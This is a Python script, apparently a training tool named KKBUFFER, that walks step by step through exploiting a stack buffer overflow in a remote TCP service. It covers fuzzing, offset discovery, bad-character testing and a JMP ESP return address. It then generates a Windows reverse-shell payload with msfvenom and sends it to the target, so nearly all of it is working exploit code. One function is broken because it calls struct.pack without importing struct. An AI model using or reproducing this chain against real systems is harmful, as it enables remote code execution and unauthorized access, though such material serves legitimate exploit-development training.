#!/usr/bin/python3
# -*- coding: UTF-8 -*-

# Importa a biblioteca Socket
import socket
# Importa a biblioteca Struct
from struct import pack
import argparse
import subprocess
import time
import random
import itertools
import sys
import os
# Get the current directory
current_directory = os.getcwd()
# Change to the current directory (this is redundant but demonstrates the concept)
# os.chdir(current_directory)

def printbanner():
    help_dependencies="generic_send_tcp, msfvenom"

    # print multiline banner
    print("""
  [1;33m\\\\\\[0;0m ┌─────────────────────┐   [0;44m KK [0;0m[0;45m BUFFER [0;0m
   (o>│[0;1;34;94m╻┏[0m [0;1;34;94m╻┏[0m [0;1;34;94m╺┳╸┏━┓┏━┓╻[0m  [0;34m┏━┓[0m│   [1;97m Author:  Otávio Augusto[0;0m
  _//)│[0;1;34;94m┣┻┓┣┻┓[0m [0;1;34;94m┃[0m [0;34m┃[0m [0;34m┃┃[0m [0;34m┃┃[0m  [0;34m┗━┓[0m│   [1;97m Contact: contact@oaugusto.pro[0;0m
 ///_)│[0;34m╹[0m [0;34m╹╹[0m [0;34m╹[0m [0;34m╹[0m [0;34m┗━┛┗━┛┗[0;37m━╸┗━┛[0m│   [1;97m Website: https://oaugusto.pro[0;0m
//_|_ └─────────────────────┘   [1;97m Social:  @oaugustopro[0;0m

[0;100m ☕version [0;42m 0.1 [0;0m [0;100m ✌license [0;42m MIT [0;0m 
=================[0;0m [1;97mKKBUFFER[0;0m =================[0;0m
Passo a passo para a exploração de uma vulnerabilidade de buffer overflow
    """)
    print("Depends on "+help_dependencies + "\n")

# Convert address to little endian format
def to_little_endian(hex_string):
    # Split into bytes and reverse for little-endian
    bytes_reversed = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)][::-1]
    # Convert to bytes
    return bytes.fromhex(''.join(bytes_reversed))

def identify_sequence(host, port, script_file, nr_one, nr_two):
    print("* First step, identify which sequence can crash the application.")
    print("|-> using generic send tcp with a spike script, configured with the application supported command send it with the application oppened in debbuger, then get te result from the register to see which sequence can crash the application.")
    print("|-> after that you have to know which is the minimum chars to crash the application.")

    command = [
    "generic_send_tcp",
    host,
    port,
    script_file,
    nr_one,
    nr_two,
    ]

    # Execute the command and redirect its output to payload.py
    with open("/tmp/kkbuffer-sequence.txt", "w") as file:
        subprocess.run(command, stdout=file)
    # send_enhanced_fuzzed_data_debug(host, int(port), [("s_string", s_string), ("s_string_variable", s_string_variable), ("s_readline", None)], 0, 0)

def test_chars_from_sequence(rhost, rport ,base_cmd, sequence):
    print("* Second step, identify minimun chars to crash the application")
    print("|-> test one by one, all the combinations from last step. Ex.: /.:/, will try / . : /. etc. It will give you the new base_cmd that will be for example: command . instead of just command")
    print("|-> after that you need the pattern to see the offset of the EIP")
    crash = 1
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((rhost,int(rport)))
        # Recebe o banner
        pattern = client.recv(1024)
        base_command = base_cmd.encode()
        # base_command = b"command "
        payload = b"A" * 2000
        # sequence = "/.:/"

        for r in range(1, len(sequence) + 1):  # r is the length of each combination
            for comb in itertools.combinations(sequence, r):
                buffer = base_command + ''.join(comb).encode() + payload
                print("Enviando Buffer")
                print(buffer)
                # Envia A para o buffer da aplicação, no socket da mesma
                client.send(buffer)
                # Recebe a resposta da aplicação
                pattern = client.recv(1024)

def pattern_create(length=8192):
    print("* Third step, create a pattern to see the offset of EIP")
    print("|-> this function will only create a pattern and save it in /tmp/pattern.txt")
    print("|-> after that use that pattern in input with command + crash_chars. Ex.: command .AsdaRSdsFASFASDAsdasdARAsdasdARSada")
    pattern = ''
    parts = ['A', 'a', '0']
    try:
        if not isinstance(length, int) and length.startswith('0x'):
            length = int(length, 16)
        elif not isinstance(length, int):
            length = int(length)
    except ValueError:
        print_help()
        sys.exit(254)
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    # save pattern in a new file in /tmp/pattern.txt
    with open("/tmp/pattern.txt", "w") as f:
        f.write(pattern)
    return pattern

def identify_offset (rhost, rport ,base_cmd):
    print("* Fourth step, use the pattern in application and get the EIP result")
    print("|-> use the pattern on input of application and get the EIP result manually")
    print("|-> after that insert the EIP result in next function to get offset")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,int(rport)))
    # Recebe o banner
    pattern = client.recv(1024)
    # Read from the file
    with open("/tmp/pattern.txt", "rb") as f:
        string_from_file = f.read()
    # You can concatenate, slice, or perform any other bytes operation:
    # buffer = b"command ." + string_from_file
    buffer = base_cmd.encode() + string_from_file

    print("Enviando Buffer")
    client.send(buffer)

def pattern_offset(value, length=8192):
    print("* Get the position of the EIP from the pattern string (Not working properly, use msf-pattern_offset instead)")
    print("|-> it will give you a integer number like 705")
    print("|-> after that you have to test it if it is correct and if you can control the EIP")
    try:
        if not isinstance(value, int) and value.startswith('0x'):
            value = struct.pack('<I', int(value, 16)).decode('utf-8').strip('\x00')
    except ValueError:
        print_help()
        sys.exit(254)
    pattern = pattern_create(length)
    try:
        print(pattern.index(value))
        return pattern.index(value)
    except ValueError:
        return 'Not found'
    
def control_eip (rhost, rport, base_cmd, offset):
    print("* Test the offset from last function")
    print("|-> test the offset and see if the EIP is filled by BBBB, or 41414141")
    print("|-> after that you need to check the bad chars of the application")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,int(rport)))
    # Recebe o banner
    pattern = client.recv(1024)
    eipstring = b"A" * int(offset) + b"BBBB"
    # You can concatenate, slice, or perform any other bytes operation:
    buffer = base_cmd.encode() + eipstring
    print("Enviando Buffer")
    client.send(buffer)

def badchars (rhost, rport, base_cmd, offset):
    print("* Identify which bad chars can crash the application")
    print("|-> this function just identify the first one, it sould be improved to loop and test untill no error is returned.")
    print("|-> after that you need to check the NOPs")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,int(rport)))
    # Recebe o banner
    pattern = client.recv(1024)
    # verifica se o address cai no EIP e quantos NOPs vai precisar
    
    eipstring = b"A" * int(offset) + b"BBBB"
    # badchars
    badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    # You can concatenate, slice, or perform any other bytes operation:
    buffer = base_cmd.encode() + eipstring + badchars
    print("Enviando Buffer")
    client.send(buffer)   

def nops_jump_esp (rhost, rport, base_cmd, offset, hex_string):
    print("* Identify the number of NOPs")
    print("|-> send it and check the number of As, Bs an Cs. The number of Nops are the number of missing letters. There are 10 As, 10 Bs, 10 Cs, etc...")
    print("|-> after that just create the payload")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,int(rport)))
    # Recebe o banner
    pattern = client.recv(1024)
    address = to_little_endian(hex_string)
    # verifica se o address cai no EIP e quantos NOPs vai precisar
    
    eipstring = b"A" * int(offset) + address + b"A" * 10 + b"B" * 10 + b"C" * 10 + b"D" * 10
    # You can concatenate, slice, or perform any other bytes operation:
    buffer = base_cmd.encode() + eipstring
    print("Enviando Buffer")
    client.send(buffer)

# Execute a system command msfvenon to create a payload and save it on /tmp/.payload. "\\x00",
def generate_payload(host,port,bad_chars):
    print("* Generate the payload")
    print("|-> generate the payload for a reverse shell, check the host and port. It will be saved on /tmp/payload.py")
    print("|-> after that just start listen and send the payload")
    command = [
    "msfvenom", 
    "-p", "windows/shell_reverse_tcp",
    "LHOST="+host,
    "LPORT="+port,
    "-b", bad_chars,
    "-f", "python",
    "-v", "payload",
    "EXITFUNC=thread"
    ]

    # Execute the command and redirect its output to payload.py
    with open("/tmp/payload.py", "w") as file:
        subprocess.run(command, stdout=file)

def insert_payload (rhost, rport, base_cmd, offset, hex_string, nops):
    print("* Start listening on your machine and insert payload on application")
    print("|-> Insert payload on application")
    print("|-> after that you have to use on the real application, not only the test version, now that you are sure that it will not crash the application.")
    import sys
    sys.path.append('/tmp')
    from payload import payload
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,int(rport)))
    # Recebe o banner
    pattern = client.recv(1024)
    address = to_little_endian(hex_string)
    eipstring = b"A" * int(offset) + address + b"\x90" * int(nops)
    
    # You can concatenate, slice, or perform any other bytes operation:
    buffer = base_cmd.encode() + eipstring + payload
    print("Enviando Buffer")
    client.send(buffer)
    
def get_interactive_args(arg_prompts):
    """Get arguments from the user interactively."""
    return [input(prompt) for prompt in arg_prompts]

def select_function_interactively(functions):
    """Display the functions and let the user select one."""
    for key, value in functions.items():
        print(f"{key}. {value['func'].__name__}")
    choice = input("Enter the number of the function to execute: ")
    if choice == '' :
        choice=-1
    try:
        return int(choice)
    except ValueError:
        print("Invalid input. Please enter a number.")

def exit_program():
    sys.exit(0)

def execute_function():
    try:
        # A dictionary mapping numbers to functions and the number of arguments they expect
        will_not_stop=True
        while will_not_stop == True:
            print("Digite uma opção"+str(will_not_stop))
            functions = {
                0: {"func": exit_program, "arg_prompts":''},
                1: {"func": identify_sequence, "arg_prompts": ["rhost: ","rport: ","script_file: ","nr_one: ","nr_two: "]},
                2: {"func": test_chars_from_sequence, "arg_prompts": ["rhost: ","rport: ","base_cmd: ","sequence: "]},
                3: {"func": pattern_create, "arg_prompts": ["length: "]},
                4: {"func": identify_offset, "arg_prompts": ["rhost: ","rport: ","base_cmd: "]},
                5: {"func": pattern_offset, "arg_prompts": ["value: ","length: "]},
                6: {"func": control_eip, "arg_prompts": ["rhost: ","rport: ","base_cmd: ","offset: "]},
                7: {"func": badchars, "arg_prompts": ["rhost: ","rport: ","base_cmd: ","offset: "]},
                8: {"func": nops_jump_esp, "arg_prompts": ["rhost: ","rport: ","base_cmd: ","offset: ","hex_string: "]},
                9: {"func": generate_payload, "arg_prompts": ["rhost: ","rport: ","bad_chars: "]},
                10: {"func": insert_payload, "arg_prompts": ["rhost: ","rport: ","base_cmd: ","offset: ","hex_string: ","nops: "]},
            }

            parser = argparse.ArgumentParser(description="Execute a function with command line arguments.")
            parser.add_argument("-f", "--function", help="Number of the function to execute", required=False)
            parser.add_argument("-args", "--arguments", nargs='*', help="Arguments for the function", required=False)

            args = parser.parse_args()

            # If function not provided, ask for it interactively
            if args.function is None:
                function_choice = select_function_interactively(functions)
            else:
                will_not_stop=False
                function_choice = int(args.function)

            # check if the function_choice is integer
            if function_choice in functions:
                func_data = functions[function_choice]
                
                # Check if arguments were provided via command line
                if args.arguments:
                    provided_args = args.arguments
                else:
                    provided_args = get_interactive_args(func_data["arg_prompts"])
                
                func_data["func"](*provided_args)
            else:
                print("Invalid function number!")
    except KeyboardInterrupt:
        print("\nUser interrupted execution. Exiting...")
        sys.exit(0)

if __name__ == "__main__":
    printbanner()
    print("* This is a manual step-by-step script to exploit a stack buffer overflow vulnerability.")
    print("|-> When entering in each function, it will give you details from itself and from the next.")
    print("|-> Remember to install generic_send_tcp, msfvenon and msf-pattern_offset")
    print("|-> You can use it in non interactive way: kkbuffer.py -f $function_number -args $args")
    print("* Start by identifying the char sequence that crash the application.")
    execute_function()